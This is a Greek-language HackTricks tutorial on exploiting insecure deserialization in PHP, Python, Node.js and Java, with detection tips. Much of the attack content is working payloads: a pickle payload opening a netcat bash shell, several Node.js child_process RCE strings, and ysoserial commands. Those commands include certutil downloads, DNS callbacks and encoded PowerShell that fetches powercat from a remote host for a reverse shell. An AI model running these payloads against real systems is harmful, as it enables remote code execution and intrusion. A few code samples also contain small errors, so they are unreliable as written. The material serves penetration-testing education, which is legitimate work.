# Απεικόνιση

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης των HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στα HackTricks** ή να **κατεβάσετε τα HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Η **Απεικόνιση (Serialization)** εννοείται ως η μέθοδος μετατροπής ενός αντικειμένου σε ένα μορφή που μπορεί να διατηρηθεί, με σκοπό είτε την αποθήκευση του αντικειμένου είτε τη μετάδοσή του ως μέρος ενός διαδικασίας επικοινωνίας. Αυτή η τεχνική χρησιμοποιείται συχνά για να διασφαλιστεί ότι το αντικείμενο μπορεί να ανακτηθεί σε μεταγενέστερο χρόνο, διατηρώντας τη δομή και την κατάστασή του.

Η **Απο-Απεικόνιση (Deserialization)**, αντίστροφα, είναι η διαδικασία που αντιδρά στην απεικόνιση. Περιλαμβάνει τη λήψη δεδομένων που έχουν δομηθεί σε συγκεκριμένη μορφή και την ανακατασκευή τους πίσω σε ένα αντικείμενο.

Η απο-απεικόνιση μπορεί να είναι επικίνδυνη επειδή πιθανόν **επιτρέπει στους επιτιθέμενους να διαχειριστοών τα απεικονισμένα δεδομένα για την εκτέλεση κακόβουλου κώδικα** ή για την πρόκληση μη αναμενόμενης συμπεριφοράς στην εφαρμογή κατά τη διαδικασία ανακατασκευής του αντικειμένου.

## PHP

Στην PHP, συγκεκριμένες μαγικές μέθοδοι χρησιμοποιούνται κατά τις διαδικασίες απεικόνισης και απο-απεικόνισης:

* `__sleep`: Καλείται όταν ένα αντικείμενο απεικονίζεται. Αυτή η μέθοδος πρέπει να επιστρέφει έναν πίνακα με τα ονόματα όλων των ιδιοτήτων του αντικειμένου που πρέπει να απεικονιστούν. Χρησιμοποιείται συχνά για την αποθήκευση εκκρεμών δεδομένων ή για παρόμοιες εργασίες καθαρισμού.
* `__wakeup`: Καλείται όταν ένα αντικείμενο απο-απεικονίζεται. Χρησιμοποιείται για την επαναφορά οποιασδήποτε σύνδεσης βάσης δεδομένων που ενδέχεται να έχει χαθεί κατά την απεικόνιση και για την εκτέλεση άλλων εργασιών επαναεκκίνησης.
* `__unserialize`: Αυτή η μέθοδος καλείται αντί της `__wakeup` (αν υπάρχει) όταν ένα αντικείμενο απο-απεικονίζεται. Παρέχει μεγαλύτερο έλεγχο στη διαδικασία απο-απεικόνισης σε σύγκριση με τη `__wakeup`.
* `__destruct`: Αυτή η μέθοδος καλείται όταν ένα αντικείμενο είναι έτοιμο να καταστραφεί ή όταν τελειώνει το σενάριο. Χρησιμοποιείται τυπικά για εργασίες καθαρισμού, όπως το κλείσιμο χειριστηρίων αρχείων ή συνδέσεων βάσης δεδομένων.
* `__toString`: Αυτή η μέθοδος επιτρέπει σε ένα αντικείμενο να χειριστεί ως συμβολοσειρά. Μπορεί να χρησιμοποιηθεί για την ανάγνωση ενός αρχείου ή άλλων εργασιών με βάση τις κλήσεις συναρτήσεων μέσα σε αυτή, παρέχοντας αποτελεσματικά μια κειμενική αναπαράσταση του αντικειμένου.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Εάν κοιτάξετε τα αποτελέσματα, μπορείτε να δείτε ότι οι λειτουργίες **`__wakeup`** και **`__destruct`** καλούνται όταν το αντικείμενο αποσειριοποιείται. Σημειώστε ότι σε αρκετά εγχειρίδια θα βρείτε ότι η λειτουργία **`__toString`** καλείται όταν προσπαθείτε να εκτυπώσετε κάποια ιδιότητα, αλλά φαίνεται ότι αυτό **δεν συμβαίνει πλέον**.

{% hint style="warning" %}
Η μέθοδος **`__unserialize(array $data)`** καλείται **αντί για την `__wakeup()`** αν υλοποιείται στην κλάση. Σας επιτρέπει να αποσειριοποιήσετε το αντικείμενο παρέχοντας τα σειριοποιημένα δεδομένα ως έναν πίνακα. Μπορείτε να χρησιμοποιήσετε αυτήν τη μέθοδο για να αποσειριοποιήσετε ιδιότητες και να εκτελέσετε οποιεσδήποτε απαραίτητες εργασίες κατά την αποσειριοποίηση.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Μπορείτε να διαβάσετε ένα εξηγημένο παράδειγμα **PHP εδώ**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), εδώ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ή εδώ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Φόρτωση Κλάσεων Autoload

Μπορείτε να εκμεταλλευτείτε τη λειτουργικότητα φόρτωσης του PHP autoload για να φορτώσετε τυχαία αρχεία php και περισσότερα:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Σειριοποίηση Αναφερόμενων Τιμών

Αν για κάποιο λόγο θέλετε να σειριοποιήσετε μια τιμή ως **αναφορά σε μια άλλη τιμή που έχει σειριοποιηθεί** μπορείτε:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial για PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) μπορεί να σας βοηθήσει να δημιουργήσετε payloads για να καταχραστείτε τις αποσειριοποιήσεις PHP.\
Σημειώστε ότι σε πολλές περιπτώσεις **δε θα μπορείτε να βρείτε έναν τρόπο να εκμεταλλευτείτε μια αποσειριοποίηση στον πηγαίο κώδικα** της εφαρμογής αλλά μπορείτε να **εκμεταλλευτείτε τον κώδικα εξωτερικών επεκτάσεων PHP.**\
Έτσι, αν μπορείτε, ελέγξτε το `phpinfo()` του διακομιστή και **ψάξτε στο διαδίκτυο** (ακόμη και στα **gadgets** του **PHPGGC**) κάποιο πιθανό gadget που θα μπορούσατε να εκμεταλλευτείτε.

### αποσειριοποίηση μεταδεδομένων phar://

Αν έχετε βρει ένα LFI που απλώς διαβάζει το αρχείο και δεν εκτελεί τον κώδικα PHP μέσα σε αυτό, για παράδειγμα χρησιμοποιώντας συναρτήσεις όπως _**file\_get\_contents(), fopen(), file() ή file\_exists(), md5\_file(), filemtime() ή filesize()**_**.** Μπορείτε να δοκιμάσετε να εκμεταλλευτείτε μια **αποσειριοποίηση** που συμβαίνει όταν **διαβάζετε** ένα **αρχείο** χρησιμοποιώντας το πρωτόκολλο **phar**.\
Για περισσότερες πληροφορίες διαβάστε την ακόλουθη ανάρτηση:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Όταν το αντικείμενο αποσυμπιέζεται, η συνάρτηση _\_\_reduce\_\__ θα εκτελεστεί.\
Όταν εκμεταλλευτείται, ο διακομιστής μπορεί να επιστρέψει ένα σφάλμα.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Για περισσότερες πληροφορίες σχετικά με τον τρόπο απόδρασης από τα **pickle jails** ελέγξτε:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Η ακόλουθη σελίδα παρουσιάζει την τεχνική για την **κατάχρηση μιας μη ασφαλούς αποσειριοποίησης στις βιβλιοθήκες python yamls** και ολοκληρώνεται με ένα εργαλείο που μπορεί να χρησιμοποιηθεί για τη δημιουργία φορτίου αποσειριοποίησης RCE για **Pickle, PyYAML, jsonpickle και ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Ρύπανση Κλάσης (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

Το JS **δεν έχει "μαγικές" συναρτήσεις** όπως τα PHP ή τα Python που θα εκτελεστούν μόνο για τη δημιουργία ενός αντικειμένου. Ωστόσο, έχει μερικές **συναρτήσεις** που **χρησιμοποιούνται συχνά ακόμα και χωρίς να καλούνται απευθείας** όπως το **`toString`**, **`valueOf`**, **`toJSON`**.\
Αν καταχραστείτε μια αποσειριοποίηση μπορείτε να **θέσετε σε κίνδυνο αυτές τις συναρτήσεις για να εκτελέσετε άλλον κώδικα** (πιθανώς καταχρώμενοι τις ρυπάνσεις πρωτοτύπων) μπορείτε να εκτελέσετε αυθαίρετο κώδικα όταν καλούνται.

Ένας άλλος **"μαγικός" τρόπος να καλέσετε μια συνάρτηση** χωρίς να την καλέσετε απευθείας είναι με το **να θέσετε σε κίνδυνο ένα αντικείμενο που επιστρέφεται από μια ασύγχρονη συνάρτηση** (promise). Διότι, αν **μετατρέψετε** αυτό το **αντικείμενο επιστροφής** σε ένα άλλο **promise** με μια **ιδιότητα** που ονομάζεται **"then" τύπου συνάρτηση**, θα **εκτελεστεί** απλά επειδή επιστρέφεται από ένα άλλο promise. _Ακολουθήστε_ [_**αυτόν τον σύνδεσμο**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _για περισσότερες πληροφορίες._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` και `prototype` ρύπανση

Αν θέλετε να μάθετε για αυτήν την τεχνική **ρίξτε μια ματιά στο παρακάτω εγχειρίδιο**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Αυτή η βιβλιοθήκη επιτρέπει την σειριοποίηση συναρτήσεων. Παράδειγμα:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Το **σειριοποιημένο αντικείμενο** θα φαίνεται όπως:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Μπορείτε να δείτε στο παράδειγμα ότι όταν μια συνάρτηση σειριοποιείται, η σημαία `_$$ND_FUNC$$_` προστίθεται στο αντικείμενο που σειριοποιείται.

Μέσα στο αρχείο `node-serialize/lib/serialize.js` μπορείτε να βρείτε την ίδια σημαία και πώς ο κώδικας τη χρησιμοποιεί.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Όπως μπορείτε να δείτε στο τελευταίο κομμάτι κώδικα, **αν βρεθεί η σημαία** χρησιμοποιείται το `eval` για να ανασειριοποιήσει τη συνάρτηση, οπότε βασικά **η είσοδος του χρήστη χρησιμοποιείται μέσα στη συνάρτηση `eval`**.

Ωστόσο, **απλά σειριοποιώντας** μια συνάρτηση **δεν θα την εκτελέσει** καθώς θα ήταν απαραίτητο να υπάρχει κάποιο τμήμα του κώδικα που να καλεί το `y.rce` στο παράδειγμά μας και αυτό είναι υψηλά **απίθανο**.\
Πάντως, θα μπορούσατε απλά **να τροποποιήσετε το σειριοποιημένο αντικείμενο** **προσθέτοντας μερικές παρενθέσεις** ώστε να εκτελεί αυτόματα τη σειριοποιημένη συνάρτηση όταν ανασειριοποιείται το αντικείμενο.\
Στο επόμενο κομμάτι κώδικα **παρατηρήστε την τελευταία παρένθεση** και πώς η συνάρτηση `unserialize` θα εκτελέσει αυτόματα τον κώδικα:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Όπως προαναφέρθηκε, αυτή η βιβλιοθήκη θα λάβει τον κώδικα μετά το `_$$ND_FUNC$$_` και θα τον **εκτελέσει** χρησιμοποιώντας το `eval`. Επομένως, για να **αυτοεκτελέσετε κώδικα** μπορείτε να **διαγράψετε το τμήμα δημιουργίας της συνάρτησης** και την τελευταία παρένθεση και **απλά να εκτελέσετε ένα JS oneliner** όπως στο παρακάτω παράδειγμα:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Μπορείτε να [**βρείτε εδώ**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **περισσότερες πληροφορίες** σχετικά με το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια.

### [funcster](https://www.npmjs.com/package/funcster)

Ένα σημαντικό χαρακτηριστικό του **funcster** είναι η μη προσβασιμότητα των **κανονικών ενσωματωμένων αντικειμένων**· βρίσκονται εκτός του προσβάσιμου πεδίου. Αυτός ο περιορισμός αποτρέπει την εκτέλεση κώδικα που προσπαθεί να καλέσει μεθόδους σε ενσωματωμένα αντικείμενα, οδηγώντας σε εξαιρέσεις όπως `"ReferenceError: console is not defined"` όταν χρησιμοποιούνται εντολές όπως `console.log()` ή `require(something)`.

Παρά τον περιορισμό αυτό, η ανάκτηση πλήρη πρόσβασης στο γενικό πλαίσιο, συμπεριλαμβανομένων όλων των κανονικών ενσωματωμένων αντικειμένων, είναι δυνατή μέσω μιας συγκεκριμένης προσέγγισης. Χρησιμοποιώντας απευθείας το γενικό πλαίσιο, μπορεί κανείς να παρακάμψει αυτόν τον περιορισμό. Για παράδειγμα, η πρόσβαση μπορεί να ανακτηθεί χρησιμοποιώντας το ακόλουθο απόσπασμα:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Για** [**περισσότερες πληροφορίες διαβάστε αυτή την πηγή**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Το πακέτο **serialize-javascript** σχεδιάστηκε αποκλειστικά για σκοπούς σειριοποίησης, χωρίς καμία ενσωματωμένη δυνατότητα αποσειριοποίησης. Οι χρήστες είναι υπεύθυνοι για την υλοποίηση της δικής τους μεθόδου για την αποσειριοποίηση. Η άμεση χρήση της `eval` προτείνεται από το επίσημο παράδειγμα για την αποσειριοποίηση σειριοποιημένων δεδομένων:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Αν αυτή η συνάρτηση χρησιμοποιείται για την αποσειριοποίηση αντικειμένων, μπορείτε **εύκολα να το εκμεταλλευτείτε**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Για** [**περισσότερες πληροφορίες διαβάστε αυτή την πηγή**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Βιβλιοθήκη Cryo

Στις ακόλουθες σελίδες μπορείτε να βρείτε πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτή τη βιβλιοθήκη για την εκτέλεση αυθαίρετων εντολών:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Στη Java, **οι κλήσεις ανάκλησης αποσειριοποίησης εκτελούνται κατά τη διαδικασία της αποσειριοποίησης**. Αυτή η εκτέλεση μπορεί να εκμεταλλευτείται από επιτιθέμενους που δημιουργούν κακόβουλα φορτία που ενεργοποιούν αυτές τις κλήσεις ανάκλησης, οδηγώντας σε πιθανή εκτέλεση επιβλαβών ενεργειών.

### Δακτυλικά αποτυπώματα

#### White Box

Για την αναγνώριση πιθανών ευπαθειών σειριοποίησης στον κώδικα, αναζητήστε:

* Κλάσεις που υλοποιούν τη διεπαφή `Serializable`.
* Χρήση των συναρτήσεων `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Δώστε ιδιαίτερη προσοχή σε:

* Το `XMLDecoder` που χρησιμοποιείται με παραμέτρους που έχουν οριστεί από εξωτερικούς χρήστες.
* Η μέθοδος `fromXML` του `XStream`, ειδικά αν η έκδοση του XStream είναι μικρότερη ή ίση του 1.46, καθώς είναι ευάλωτη σε θέματα σειριοποίησης.
* Το `ObjectInputStream` σε συνδυασμό με τη μέθοδο `readObject`.
* Υλοποίηση μεθόδων όπως `readObject`, `readObjectNodData`, `readResolve`, ή `readExternal`.
* Το `ObjectInputStream.readUnshared`.
* Γενική χρήση του `Serializable`.

#### Black Box

Για δοκιμές με μαύρο κουτί, αναζητήστε συγκεκριμένες **υπογραφές ή "Magic Bytes"** που υποδηλώνουν αντικείμενα σειριοποίησης Java (προερχόμενα από το `ObjectInputStream`):

* Δεκαεξαδικό πρότυπο: `AC ED 00 05`.
* Πρότυπο Base64: `rO0`.
* Κεφαλίδες απάντησης HTTP με το `Content-type` ορισμένο σε `application/x-java-serialized-object`.
* Δεκαεξαδικό πρότυπο που υποδηλώνει προηγούμενη συμπίεση: `1F 8B 08 00`.
* Πρότυπο Base64 που υποδηλώνει προηγούμενη συμπίεση: `H4sIA`.
* Αρχεία ιστού με την επέκταση `.faces` και την παράμετρο `faces.ViewState`. Η ανακάλυψη αυτών των προτύπων σε μια εφαρμογή ιστού θα πρέπει να προκαλέσει έλεγχο όπως αναφέρεται λεπτομερώς στην [ανάρτηση σχετικά με την αποσειριοποίηση του Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Έλεγχος εάν υπάρχει ευπάθεια

Εάν θέλετε να **μάθετε πώς λειτουργεί μια εκμετάλλευση αποσειριοποίησης Java**, πρέπει να ρίξετε μια ματιά στα [**Βασικά Java Αποσειριοποίησης**](basic-java-deserialization-objectinputstream-readobject.md), [**Αποσειριοποίηση DNS Java**](java-dns-deserialization-and-gadgetprobe.md) και [**Πληθυσμός CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Δοκιμή White Box

Μπορείτε να ελέγξετε εάν έχει εγκατασταθεί κάποια εφαρμογή με γνωστές ευπάθειες.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Μπορείτε να **ελέγξετε όλες τις βιβλιοθήκες** που είναι γνωστό ότι είναι ευάλωτες και για τις οποίες το [**Ysoserial**](https://github.com/frohoff/ysoserial) μπορεί να παρέχει εκμετάλλευση. Ή μπορείτε να ελέγξετε τις βιβλιοθήκες που αναφέρονται στο [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Μπορείτε επίσης να χρησιμοποιήσετε το [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) για να αναζητήσετε πιθανές αλυσίδες gadget που μπορούν να εκμεταλλευτούν.\
Όταν εκτελείτε το **gadgetinspector** (μετά την κατασκευή του), μην ανησυχείτε για τις πολλές προειδοποιήσεις/σφάλματα που εμφανίζονται και αφήστε το να ολοκληρωθεί. Θα γράψει όλα τα ευρήματα στο _gadgetinspector/gadget-results/gadget-chains-έτος-μήνα-ημέρα-ώρα-λεπτό.txt_. Παρακαλώ, σημειώστε ότι το **gadgetinspector δεν θα δημιουργήσει μια εκμετάλλευση και μπορεί να εμφανίσει ψευδείς θετικά**.

#### Δοκιμή Μαύρου Κουτιού

Χρησιμοποιώντας την επέκταση του Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) μπορείτε να αναγνωρίσετε **ποιες βιβλιοθήκες είναι διαθέσιμες** (και ακόμα και τις εκδόσεις). Με αυτές τις πληροφορίες θα μπορούσε να είναι **ευκολότερο να επιλέξετε ένα payload** για να εκμεταλλευτείτε την ευπάθεια.\
[**Διαβάστε αυτό για να μάθετε περισσότερα σχετικά με το GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
Το GadgetProbe επικεντρώνεται στις **αποσειριοποιήσεις `ObjectInputStream`**.

Χρησιμοποιώντας την επέκταση του Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) μπορείτε να **αναγνωρίσετε ευάλωτες βιβλιοθήκες** που μπορούν να εκμεταλλευτούν με το ysoserial και να τις **εκμεταλλευτείτε**.\
[**Διαβάστε αυτό για να μάθετε περισσότερα σχετικά με το Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Το Java Deserialization Scanner επικεντρώνεται στις **αποσειριοποιήσεις `ObjectInputStream`**.

Μπορείτε επίσης να χρησιμοποιήσετε το [**Freddy**](https://github.com/nccgroup/freddy) για να **ανιχνεύσετε ευπάθειες αποσειριοποιήσεις** στο **Burp**. Αυτό το πρόσθετο θα ανιχνεύσει **όχι μόνο ευπάθειες που σχετίζονται με το `ObjectInputStream`** αλλά **επίσης** ευπάθειες από βιβλιοθήκες αποσειριοποίησης **Json** και **Yml**. Σε ενεργό καθεστώς, θα προσπαθήσει να τις επιβεβαιώσει χρησιμοποιώντας payloads sleep ή DNS.\
[**Μπορείτε να βρείτε περισσότερες πληροφορίες σχετικά με το Freddy εδώ.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Δοκιμή Σειριοποίησης**

Δεν είναι όλα για τον έλεγχο εάν χρησιμοποιείται κάποια ευάλωτη βιβλιοθήκη από τον διακομιστή. Μερικές φορές μπορείτε να **αλλάξετε τα δεδομένα μέσα στο σειριοποιημένο αντικείμενο και να παρακάμψετε μερικούς ελέγχους** (ίσως να σας χορηγήσει δικαιώματα διαχειριστή μέσα σε μια web εφαρμογή).\
Αν βρείτε ένα σειριοποιημένο αντικείμενο Java που στέλνεται σε μια web εφαρμογή, **μπορείτε να χρησιμοποιήσετε το** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **για να εκτυπώσετε σε ένα πιο ευανάγνωστο μορφή το σειριοποιημένο αντικείμενο που στέλνεται**. Γνωρίζοντας ποια δεδομένα στέλνετε θα είναι πιο εύκολο να τα τροποποιήσετε και να παρακάμψετε μερικούς ελέγχους.

### **Εκμετάλλευση**

#### **ysoserial**

Το κύριο εργαλείο για την εκμετάλλευση των αποσειριοποιήσεων Java είναι το [**ysoserial**](https://github.com/frohoff/ysoserial) ([**κατεβάστε εδώ**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Μπορείτε επίσης να λάβετε υπόψη τη χρήση του [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) το οποίο θα σας επιτρέψει να χρησιμοποιήσετε πολύπλοκες εντολές (με σωληνώσεις για παράδειγμα).\
Σημειώστε ότι αυτό το εργαλείο είναι **επικεντρωμένο** στην εκμετάλλευση του **`ObjectInputStream`**.\
Θα **ξεκινούσα χρησιμοποιώντας το payload "URLDNS"** πριν από ένα payload RCE για να δοκιμάσω αν η ενσωμάτωση είναι δυνατή. Πάντως, σημειώστε ότι ίσως το payload "URLDNS" να μη λειτουργεί, αλλά άλλο payload RCE να λειτουργεί.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
